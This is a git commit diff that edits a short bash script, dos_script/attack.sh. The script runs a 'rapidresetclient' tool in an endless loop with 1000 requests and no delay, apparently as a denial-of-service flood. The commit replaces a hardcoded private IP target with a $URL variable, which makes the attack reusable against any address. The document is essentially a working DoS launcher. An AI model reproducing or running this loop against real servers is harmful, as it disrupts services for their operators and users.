8ba2ac7e87a838d5b9566abd9e0b5f8b82fcbb7b
Millen93 <127392212+Millen93@users.noreply.github.com>
2024-06-29 01:06:57 +0300

    Update attack.sh

--- dos_script/attack.sh
+++ dos_script/attack.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-while true ; do ./rapidresetclient -requests 1000 -url https://192.168.0.108:443 -wait=0 -delay=0 -concurrency=1 ; done 
+while true ; do ./rapidresetclient -requests 1000 -url $URL -wait=0 -delay=0 -concurrency=1 ; done 
